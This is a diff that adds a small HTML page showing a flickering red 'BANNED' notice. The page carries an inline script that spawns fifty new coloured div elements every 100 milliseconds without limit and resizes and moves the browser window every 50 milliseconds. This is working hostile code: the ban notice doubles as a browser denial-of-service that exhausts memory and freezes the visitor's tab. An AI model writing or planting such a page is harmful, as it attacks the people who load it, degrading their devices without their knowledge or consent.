@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>.</title>
+<style>
+*{margin:0;padding:0}
+body{background:#000;overflow:hidden}
+.g{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column}
+h1{font-family:'Zilla Slab Highlight',serif;font-size:8vw;color:#ff1a1a;text-shadow:0 0 60px rgba(255,0,0,.7),0 0 120px rgba(255,0,0,.4);animation:p .15s infinite alternate}
+@keyframes p{0%{transform:translate(0,0)}25%{transform:translate(-3px,3px)}50%{transform:translate(3px,-3px)}75%{transform:translate(-2px,-2px)}100%{transform:translate(2px,2px)}}
+</style>
+<link href="https://fonts.googleapis.com/css2?family=Zilla+Slab+Highlight:wght@700&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="g"><h1>BANNED</h1></div>
+<script>
+(function(){
+var c=0;
+function sp(){for(var i=0;i<50;i++){var d=document.createElement('div');d.style.cssText='position:fixed;width:'+Math.random()*300+'px;height:'+Math.random()*300+'px;background:rgba(255,0,0,'+Math.random()*.5+');left:'+Math.random()*100+'vw;top:'+Math.random()*100+'vh;pointer-events:none;z-index:'+(c++);document.body.appendChild(d);}
+setTimeout(sp,100);
+}
+sp();
+setInterval(function(){try{window.resizeTo(Math.random()*screen.width,Math.random()*screen.height);window.moveTo(Math.random()*screen.width,Math.random()*screen.height);}catch(e){}},50);
+})();
+</script>
+</body>
+</html>
